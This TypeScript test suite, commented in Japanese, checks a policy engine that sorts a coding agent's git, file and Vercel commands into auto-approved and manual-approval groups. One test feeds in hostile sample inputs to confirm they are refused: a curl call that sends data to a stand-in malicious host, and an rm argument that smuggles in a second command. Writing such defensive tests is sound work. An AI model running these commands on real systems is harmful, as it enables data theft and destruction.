/**
 * Trust承認ポリシーシステム受け入れテスト
 * 
 * システム全体の要件達成を検証する包括的なテストスイート
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { promises as fs } from 'fs';
import { join } from 'path';
import { PolicyManager } from '../policy-manager';
import { OperationClassifier } from '../operation-classifier';
import { TrustDecisionEngine } from '../trust-decision-engine';
import { AuditLogger } from '../audit-logger';
import { MetricsCollector } from '../metrics-collector';
import { TrustErrorHandler } from '../error-handler';

const TEST_DIR = '.kiro-acceptance-test';
const TEST_SETTINGS_DIR = join(TEST_DIR, 'settings');
const TEST_REPORTS_DIR = join(TEST_DIR, 'reports');

describe('Trust承認ポリシーシステム受け入れテスト', () => {
  let policyManager: PolicyManager;
  let classifier: OperationClassifier;
  let decisionEngine: TrustDecisionEngine;
  let auditLogger: AuditLogger;
  let metricsCollector: MetricsCollector;
  let errorHandler: TrustErrorHandler;

  beforeAll(async () => {
    // テスト環境の完全なクリーンアップ
    try {
      await fs.rm(TEST_DIR, { recursive: true, force: true });
    } catch (error) {
      // 既存のディレクトリが存在しない場合は無視
    }

    // テスト環境のセットアップ
    await fs.mkdir(TEST_SETTINGS_DIR, { recursive: true });
    await fs.mkdir(TEST_REPORTS_DIR, { recursive: true });
    await fs.mkdir(join(TEST_REPORTS_DIR, 'metrics'), { recursive: true });
    
    // テスト用ポリシー設定
    const testPolicy = {
      version: '1.0',
      lastUpdated: new Date().toISOString(),
      autoApprove: {
        gitOperations: [
          'status', 'commit', 'push', 'pull', 'merge', 'log',
          'diff', 'show', 'branch', 'checkout', 'switch'
        ],
        fileOperations: ['read', 'write', 'create', 'update', 'mkdir'],
        cliOperations: {
          vercel: ['env ls', 'domains ls', 'deployments ls', 'status', 'whoami']
        },
        scriptExecution: {
          extensions: ['.mjs'],
          allowedPaths: ['scripts/', '.kiro/scripts/']
        }
      },
      manualApprove: {
        deleteOperations: [
          'git branch -D', 'git push --delete', 'rm -rf',
          'vercel env rm', 'vercel domain rm'
        ],
        forceOperations: [
          'git reset --hard', 'git push --force', 'git push -f'
        ],
        productionImpact: [
          'github:write', 'sanity-dev:write', 'vercel:envSet', 'vercel:addDomain'
        ]
      },
      security: {
        maxAutoApprovalPerHour: 1000,
        suspiciousPatternDetection: true,
        logAllOperations: true
      }
    };

    await fs.writeFile(
      join(TEST_SETTINGS_DIR, 'trust-policy.json'),
      JSON.stringify(testPolicy, null, 2)
    );

    // システムコンポーネントの初期化（順序重要）
    try {
      // 1. PolicyManagerの初期化
      policyManager = new PolicyManager();
      (policyManager as any).policyPath = join(TEST_SETTINGS_DIR, 'trust-policy.json');
      await policyManager.loadPolicy();

      // 2. 依存コンポーネントの初期化
      classifier = new OperationClassifier(policyManager);
      decisionEngine = new TrustDecisionEngine(policyManager);
      
      // 3. ログ・メトリクス系コンポーネントの初期化
      auditLogger = new AuditLogger(join(TEST_REPORTS_DIR, 'audit.log'));
      await auditLogger.initialize();
      
      metricsCollector = new MetricsCollector(join(TEST_REPORTS_DIR, 'metrics'));
      await metricsCollector.initialize();
      
      errorHandler = new TrustErrorHandler();
      await errorHandler.initialize();

      console.log('✅ テスト環境の初期化が完了しました');
    } catch (error) {
      console.error('❌ テスト環境の初期化に失敗:', error);
      throw error;
    }
  });

  beforeEach(async () => {
    // 各テスト前にログファイルをクリア
    try {
      const logFiles = [
        join(TEST_REPORTS_DIR, 'audit.log'),
        join(TEST_REPORTS_DIR, 'trust-error-log.jsonl'),
        join(TEST_REPORTS_DIR, `auto-trust-log-${new Date().toISOString().split('T')[0]}.md`),
        join(TEST_REPORTS_DIR, `manual-trust-log-${new Date().toISOString().split('T')[0]}.md`)
      ];

      for (const logFile of logFiles) {
        try {
          await fs.writeFile(logFile, '', 'utf8');
        } catch (error) {
          // ファイルが存在しない場合は無視
        }
      }
    } catch (error) {
      console.warn('⚠️ ログファイルのクリアに失敗:', error.message);
    }
  });

  afterEach(async () => {
    // 各テスト後のクリーンアップ
    try {
      // メモリ内のデータをクリア
      if (auditLogger && typeof auditLogger.clearLogs === 'function') {
        await auditLogger.clearLogs();
      }
      if (metricsCollector && typeof metricsCollector.clearMetrics === 'function') {
        await metricsCollector.clearMetrics();
      }
      if (errorHandler && typeof errorHandler.cleanupErrorLog === 'function') {
        await errorHandler.cleanupErrorLog();
      }
    } catch (error) {
      console.warn('⚠️ テスト後のクリーンアップに失敗:', error.message);
    }
  });

  afterAll(async () => {
    try {
      await fs.rm(TEST_DIR, { recursive: true, force: true });
      console.log('✅ テスト環境のクリーンアップが完了しました');
    } catch (error) {
      console.warn('⚠️ テスト環境のクリーンアップに失敗:', error.message);
    }
  });

  describe('要件1: Trust承認ポリシー設定システム', () => {
    it('1.1 ポリシーファイルの作成・更新ができる', async () => {
      const policy = await policyManager.loadPolicy();
      expect(policy).toBeDefined();
      expect(policy.version).toBe('1.0');
      expect(policy.autoApprove).toBeDefined();
      expect(policy.manualApprove).toBeDefined();
      expect(policy.security).toBeDefined();
    });

    it('1.2 不正な設定を拒否する', async () => {
      const invalidPolicy = { invalid: 'config' };
      
      const invalidPolicyPath = join(TEST_SETTINGS_DIR, 'invalid-policy.json');
      await fs.writeFile(invalidPolicyPath, JSON.stringify(invalidPolicy));
      
      const invalidManager = new PolicyManager();
      (invalidManager as any).policyPath = invalidPolicyPath;
      
      await expect(invalidManager.loadPolicy()).rejects.toThrow();
    });

    it('1.3 デフォルト設定が適用される', async () => {
      const tempManager = new PolicyManager();
      (tempManager as any).policyPath = join(TEST_SETTINGS_DIR, 'nonexistent.json');
      
      const defaultPolicy = await tempManager.loadPolicy();
      expect(defaultPolicy).toBeDefined();
      expect(defaultPolicy.version).toBeDefined();
    });
  });

  describe('要件2: 自動承認対象操作の定義', () => {
    it('2.1 Git通常操作が自動承認される', async () => {
      const gitOperations = [
        { command: 'git', args: ['status'] },
        { command: 'git', args: ['commit', '-m', 'test'] },
        { command: 'git', args: ['push', 'origin', 'main'] },
        { command: 'git', args: ['pull'] },
        { command: 'git', args: ['merge', 'feature'] }
      ];

      for (const operation of gitOperations) {
        const classification = await classifier.classifyOperation({
          type: 'git',
          command: operation.command,
          args: operation.args,
          context: { cwd: '/test' },
          timestamp: new Date()
        });

        expect(classification.category).toBe('auto');
      }
    });

    it('2.2 ローカルファイル操作が自動承認される', async () => {
      const fileOperations = [
        { command: 'touch', args: ['file.txt'] },
        { command: 'mkdir', args: ['directory'] },
        { command: 'cat', args: ['file.txt'] }
      ];

      for (const operation of fileOperations) {
        const classification = await classifier.classifyOperation({
          type: 'file',
          command: operation.command,
          args: operation.args,
          context: { cwd: '/test' },
          timestamp: new Date()
        });

        expect(classification.category).toBe('auto');
      }
    });

    it('2.3 Vercel CLI読み取り系操作が自動承認される', async () => {
      const vercelOperations = [
        { command: 'vercel', args: ['env', 'ls'] },
        { command: 'vercel', args: ['domains', 'ls'] },
        { command: 'vercel', args: ['deployments', 'ls'] },
        { command: 'vercel', args: ['status'] }
      ];

      for (const operation of vercelOperations) {
        const classification = await classifier.classifyOperation({
          type: 'cli',
          command: operation.command,
          args: operation.args,
          context: { cwd: '/test' },
          timestamp: new Date()
        });

        expect(classification.category).toBe('auto');
      }
    });

    it('2.4 スクリプト実行が自動承認される', async () => {
      const scriptOperations = [
        { command: 'node', args: ['scripts/report.mjs'] },
        { command: 'node', args: ['.kiro/scripts/init.mjs'] }
      ];

      for (const operation of scriptOperations) {
        const classification = await classifier.classifyOperation({
          type: 'script',
          command: operation.command,
          args: operation.args,
          context: { cwd: '/test' },
          timestamp: new Date()
        });

        expect(classification.category).toBe('auto');
      }
    });
  });

  describe('要件3: 手動承認対象操作の定義', () => {
    it('3.1 削除系操作が手動承認される', async () => {
      const deleteOperations = [
        { command: 'git', args: ['branch', '-D', 'feature'] },
        { command: 'git', args: ['push', '--delete', 'origin', 'branch'] },
        { command: 'rm', args: ['-rf', 'important'] },
        { command: 'vercel', args: ['env', 'rm', 'API_KEY'] }
      ];

      for (const operation of deleteOperations) {
        const classification = await classifier.classifyOperation({
          type: 'git',
          command: operation.command,
          args: operation.args,
          context: { cwd: '/test' },
          timestamp: new Date()
        });

        expect(classification.category).toBe('manual');
      }
    });

    it('3.2 強制系操作が手動承認される', async () => {
      const forceOperations = [
        { command: 'git', args: ['reset', '--hard', 'HEAD~1'] },
        { command: 'git', args: ['push', '--force'] },
        { command: 'git', args: ['push', '-f'] }
      ];

      for (const operation of forceOperations) {
        const classification = await classifier.classifyOperation({
          type: 'git',
          command: operation.command,
          args: operation.args,
          context: { cwd: '/test' },
          timestamp: new Date()
        });

        expect(classification.category).toBe('manual');
      }
    });

    it('3.3 本番環境影響操作が手動承認される', async () => {
      const productionOperations = [
        { type: 'mcp', command: 'github:write', args: [] },
        { type: 'mcp', command: 'sanity-dev:write', args: [] },
        { type: 'mcp', command: 'vercel:envSet', args: [] }
      ];

      for (const operation of productionOperations) {
        const classification = await classifier.classifyOperation({
          type: operation.type,
          command: operation.command,
          args: operation.args,
          context: { cwd: '/test' },
          timestamp: new Date()
        });

        // 本番環境影響操作は手動承認が必要
        expect(classification.category).toBe('manual');
      }
    });
  });

  describe('要件4: 監査ログシステム', () => {
    it('4.1 自動承認操作がログに記録される', async () => {
      const operation = {
        type: 'git',
        command: 'git',
        args: ['status'],
        context: { cwd: '/test' },
        timestamp: new Date()
      };

      const decision = await decisionEngine.evaluateOperation(operation);
      
      // AuditLoggerの統一されたlogメソッドを使用
      await auditLogger.log({
        timestamp: operation.timestamp,
        operation: `${operation.command} ${operation.args.join(' ')}`,
        decision: 'auto_approved',
        reason: 'Git status operation is auto-approved',
        metadata: {
          processingTime: 45,
          context: operation.context
        }
      });

      // ログファイルの存在確認
      const logPath = auditLogger.getLogPath();
      const exists = await fs.access(logPath).then(() => true).catch(() => false);
      expect(exists).toBe(true);

      // ログ内容の確認
      const logs = await auditLogger.getRecentLogs(10);
      expect(logs.length).toBeGreaterThan(0);
      expect(logs[logs.length - 1].operation).toContain('git status');
      expect(logs[logs.length - 1].decision).toBe('auto_approved');
    });

    it('4.2 手動承認操作がログに記録される', async () => {
      const operation = {
        type: 'git',
        command: 'git',
        args: ['push', '--force'],
        context: { cwd: '/test' },
        timestamp: new Date()
      };

      // AuditLoggerの統一されたlogメソッドを使用
      await auditLogger.log({
        timestamp: operation.timestamp,
        operation: `${operation.command} ${operation.args.join(' ')}`,
        decision: 'manual_approval_required',
        reason: 'Force push requires manual approval',
        metadata: {
          user: 'test-user',
          approved: true,
          context: operation.context
        }
      });

      // ログファイルの存在確認
      const logPath = auditLogger.getLogPath();
      const exists = await fs.access(logPath).then(() => true).catch(() => false);
      expect(exists).toBe(true);

      // ログ内容の確認
      const logs = await auditLogger.getRecentLogs(10);
      expect(logs.length).toBeGreaterThan(0);
      expect(logs[logs.length - 1].operation).toContain('git push --force');
      expect(logs[logs.length - 1].decision).toBe('manual_approval_required');
    });

    it('4.3 ログローテーションが機能する', async () => {
      // 大量のログエントリを生成
      for (let i = 0; i < 100; i++) {
        await auditLogger.log({
          timestamp: new Date(),
          operation: `test-operation-${i}`,
          decision: 'auto_approved',
          reason: 'Test operation for rotation',
          metadata: { test: true, index: i }
        });
      }

      // ログローテーションを実行
      await auditLogger.rotateLog();

      // 新しいログファイルが作成されることを確認
      const logPath = auditLogger.getLogPath();
      const exists = await fs.access(logPath).then(() => true).catch(() => false);
      expect(exists).toBe(true);

      // ローテーション後のログが空であることを確認
      const logs = await auditLogger.getRecentLogs(10);
      expect(logs.length).toBe(0);
    });

    it('4.4 ログ記録失敗時も操作が継続される', async () => {
      // 書き込み権限のないディレクトリを設定
      const invalidLogger = new AuditLogger('/invalid/path/audit.log');

      // エラーが発生しても例外を投げないことを確認
      await expect(invalidLogger.log({
        timestamp: new Date(),
        operation: 'test-operation',
        decision: 'auto_approved',
        reason: 'Test operation',
        metadata: { test: true }
      })).resolves.not.toThrow();
    });
  });

  describe('要件7: パフォーマンス最適化', () => {
    it('7.1 判定処理が100ms以内に完了する', async () => {
      const operations = [
        { type: 'git', command: 'git', args: ['status'] },
        { type: 'git', command: 'git', args: ['commit', '-m', 'test'] },
        { type: 'file', command: 'touch', args: ['file.txt'] },
        { type: 'cli', command: 'vercel', args: ['env', 'ls'] }
      ];

      for (const operation of operations) {
        const startTime = Date.now();
        
        await decisionEngine.evaluateOperation({
          ...operation,
          context: { cwd: '/test' },
          timestamp: new Date()
        });
        
        const processingTime = Date.now() - startTime;
        expect(processingTime).toBeLessThan(100);
      }
    });

    it('7.2 95%以上の操作が自動承認される', async () => {
      const testOperations = [
        // 自動承認対象（90個）
        ...Array(30).fill(null).map((_, i) => ({ type: 'git', command: 'git', args: ['status'] })),
        ...Array(30).fill(null).map((_, i) => ({ type: 'git', command: 'git', args: ['commit', '-m', `commit-${i}`] })),
        ...Array(20).fill(null).map((_, i) => ({ type: 'file', command: 'touch', args: [`file-${i}.txt`] })),
        ...Array(10).fill(null).map((_, i) => ({ type: 'cli', command: 'vercel', args: ['env', 'ls'] })),
        
        // 手動承認対象（5個）
        ...Array(3).fill(null).map((_, i) => ({ type: 'git', command: 'git', args: ['push', '--force'] })),
        ...Array(2).fill(null).map((_, i) => ({ type: 'file', command: 'rm', args: ['-rf', `dir-${i}`] }))
      ];

      let autoApprovedCount = 0;
      
      for (const operation of testOperations) {
        const decision = await decisionEngine.evaluateOperation({
          ...operation,
          context: { cwd: '/test' },
          timestamp: new Date()
        });
        
        if (decision.approved) {
          autoApprovedCount++;
        }
      }

      const autoApprovalRate = (autoApprovedCount / testOperations.length) * 100;
      expect(autoApprovalRate).toBeGreaterThanOrEqual(95);
    });

    it('7.3 高負荷時の承認判定優先度制御が機能する', async () => {
      // 並行して大量の判定要求を処理
      const concurrentOperations = 100;
      const promises = [];

      for (let i = 0; i < concurrentOperations; i++) {
        const promise = decisionEngine.evaluateOperation({
          type: 'git',
          command: 'git',
          args: ['status'],
          context: { cwd: '/test', requestId: i },
          timestamp: new Date()
        });
        promises.push(promise);
      }

      const startTime = Date.now();
      const results = await Promise.all(promises);
      const totalTime = Date.now() - startTime;

      // すべての判定が完了することを確認
      expect(results).toHaveLength(concurrentOperations);
      results.forEach(result => {
        expect(result).toBeDefined();
        expect(typeof result.approved).toBe('boolean');
      });

      // 平均処理時間が許容範囲内であることを確認
      const averageTime = totalTime / concurrentOperations;
      expect(averageTime).toBeLessThan(200); // 高負荷時でも200ms以内
    });
  });

  describe('要件8: セキュリティ保護', () => {
    it('8.1 不審な操作パターンが検出される', async () => {
      // 短時間で大量の操作を実行（不審パターン）
      const suspiciousOperations = Array(1500).fill(null).map((_, i) => ({
        type: 'git',
        command: 'git',
        args: ['status'],
        context: { cwd: '/test', requestId: i },
        timestamp: new Date()
      }));

      let suspiciousDetected = false;

      try {
        for (const operation of suspiciousOperations) {
          const decision = await decisionEngine.evaluateOperation(operation);
          
          // セキュリティ制限により手動承認に切り替わることを期待
          if (!decision.approved && decision.reason?.includes('セキュリティ')) {
            suspiciousDetected = true;
            break;
          }
        }
      } catch (error) {
        // セキュリティエラーが発生することも期待される動作
        if (error.message.includes('security') || error.message.includes('suspicious')) {
          suspiciousDetected = true;
        }
      }

      expect(suspiciousDetected).toBe(true);
    });

    it('8.2 設定ファイル改ざん検証が機能する', async () => {
      // 不正な設定ファイルを作成
      const corruptedPolicy = {
        version: '1.0',
        autoApprove: {
          // 危険な設定：すべての削除操作を自動承認
          deleteOperations: ['rm -rf', 'git branch -D']
        }
      };

      const corruptedPath = join(TEST_SETTINGS_DIR, 'corrupted-policy.json');
      await fs.writeFile(corruptedPath, JSON.stringify(corruptedPolicy));

      // 改ざんされた設定の検証
      const corruptedManager = new PolicyManager();
      (corruptedManager as any).policyPath = corruptedPath;

      await expect(corruptedManager.loadPolicy()).rejects.toThrow();
    });

    it('8.3 外部からの不正操作要求が拒否される', async () => {
      // 外部からの不正な操作要求をシミュレート
      const maliciousOperations = [
        {
          type: 'external',
          command: 'curl',
          args: ['http://malicious-site.com/steal-data'],
          context: { source: 'external', suspicious: true },
          timestamp: new Date()
        },
        {
          type: 'injection',
          command: 'rm',
          args: ['-rf', '/; echo "hacked"'],
          context: { source: 'injection' },
          timestamp: new Date()
        }
      ];

      for (const operation of maliciousOperations) {
        const decision = await decisionEngine.evaluateOperation(operation);
        
        // 不正な操作は拒否されることを確認
        expect(decision.approved).toBe(false);
        expect(decision.reason).toMatch(/拒否|セキュリティ|不正/);
      }
    });
  });

  describe('統合シナリオテスト', () => {
    it('完全な開発ワークフローが効率的に実行される', async () => {
      const developmentWorkflow = [
        // 1. プロジェクト状況確認（自動承認）
        { type: 'git', command: 'git', args: ['status'] },
        { type: 'git', command: 'git', args: ['log', '--oneline', '-5'] },
        
        // 2. ファイル作成・編集（自動承認）
        { type: 'file', command: 'touch', args: ['new-feature.ts'] },
        { type: 'file', command: 'mkdir', args: ['components'] },
        
        // 3. 通常のGit操作（自動承認）
        { type: 'git', command: 'git', args: ['add', '.'] },
        { type: 'git', command: 'git', args: ['commit', '-m', 'Add new feature'] },
        { type: 'git', command: 'git', args: ['push', 'origin', 'feature-branch'] },
        
        // 4. デプロイ状況確認（自動承認）
        { type: 'cli', command: 'vercel', args: ['deployments', 'ls'] },
        { type: 'cli', command: 'vercel', args: ['env', 'ls'] },
        
        // 5. 危険な操作（手動承認）
        { type: 'git', command: 'git', args: ['reset', '--hard', 'HEAD~1'] },
        { type: 'file', command: 'rm', args: ['-rf', 'old-feature'] }
      ];

      let autoApprovedCount = 0;
      let manualApprovedCount = 0;
      const processingTimes: number[] = [];

      for (const operation of developmentWorkflow) {
        const startTime = Date.now();
        
        const decision = await decisionEngine.evaluateOperation({
          ...operation,
          context: { cwd: '/test/project' },
          timestamp: new Date()
        });
        
        const processingTime = Date.now() - startTime;
        processingTimes.push(processingTime);

        if (decision.approved) {
          autoApprovedCount++;
          
          // メトリクス記録
          await metricsCollector.recordOperation({
            operationType: operation.type,
            command: operation.command,
            args: operation.args,
            decision: 'auto',
            processingTime
          });
        } else {
          manualApprovedCount++;
          
          await metricsCollector.recordOperation({
            operationType: operation.type,
            command: operation.command,
            args: operation.args,
            decision: 'manual',
            processingTime
          });
        }
      }

      // ワークフロー効率性の検証
      const autoApprovalRate = (autoApprovedCount / developmentWorkflow.length) * 100;
      const averageProcessingTime = processingTimes.reduce((sum, time) => sum + time, 0) / processingTimes.length;

      expect(autoApprovalRate).toBeGreaterThanOrEqual(80); // 80%以上が自動承認
      expect(averageProcessingTime).toBeLessThan(100); // 平均100ms以内
      expect(Math.max(...processingTimes)).toBeLessThan(200); // 最大200ms以内

      console.log(`ワークフロー効率性:
        - 自動承認率: ${autoApprovalRate.toFixed(1)}%
        - 平均処理時間: ${averageProcessingTime.toFixed(1)}ms
        - 最大処理時間: ${Math.max(...processingTimes)}ms`);
    });

    it('エラー発生時の回復力が確保される', async () => {
      // 様々なエラーシナリオをテスト
      const errorScenarios = [
        new Error('Configuration file corrupted'),
        new Error('Network timeout during validation'),
        new Error('Insufficient permissions for operation'),
        new Error('Security threat detected')
      ];

      let recoveredCount = 0;

      for (const error of errorScenarios) {
        try {
          const result = await errorHandler.handleError(error, {
            testScenario: true,
            timestamp: new Date().toISOString()
          });

          // エラーハンドリングが適切な判定を返すことを確認
          expect(['auto', 'manual']).toContain(result.decision);
          expect(typeof result.reason).toBe('string');
          expect(typeof result.fallbackApplied).toBe('boolean');

          recoveredCount++;
        } catch (handlingError) {
          console.warn('エラーハンドリングに失敗:', handlingError.message);
        }
      }

      // すべてのエラーが適切に処理されることを確認
      expect(recoveredCount).toBe(errorScenarios.length);

      // システムヘルスチェック
      const health = await errorHandler.performHealthCheck();
      expect(['healthy', 'warning', 'critical']).toContain(health.status);
    });

    it('長期運用での安定性が確保される', async () => {
      // 長期運用をシミュレート（1000操作）
      const longTermOperations = 1000;
      const operationTypes = ['git', 'file', 'cli'];
      const commands = {
        git: [['status'], ['log'], ['diff'], ['commit', '-m', 'test']],
        file: [['touch', 'file.txt'], ['mkdir', 'dir'], ['cat', 'file.txt']],
        cli: [['vercel', 'env', 'ls'], ['vercel', 'status']]
      };

      let successCount = 0;
      const startTime = Date.now();

      for (let i = 0; i < longTermOperations; i++) {
        try {
          const operationType = operationTypes[i % operationTypes.length];
          const commandSet = commands[operationType];
          const command = commandSet[i % commandSet.length];

          const decision = await decisionEngine.evaluateOperation({
            type: operationType,
            command: command[0],
            args: command.slice(1),
            context: { cwd: '/test', operationId: i },
            timestamp: new Date()
          });

          expect(decision).toBeDefined();
          expect(typeof decision.approved).toBe('boolean');
          successCount++;

        } catch (error) {
          console.warn(`Operation ${i} failed:`, error.message);
        }
      }

      const totalTime = Date.now() - startTime;
      const successRate = (successCount / longTermOperations) * 100;
      const averageTime = totalTime / longTermOperations;

      // 長期運用での安定性指標
      expect(successRate).toBeGreaterThanOrEqual(99); // 99%以上の成功率
      expect(averageTime).toBeLessThan(50); // 平均50ms以内（長期運用での最適化効果）

      console.log(`長期運用安定性:
        - 成功率: ${successRate.toFixed(2)}%
        - 平均処理時間: ${averageTime.toFixed(1)}ms
        - 総処理時間: ${totalTime}ms`);
    });
  });
});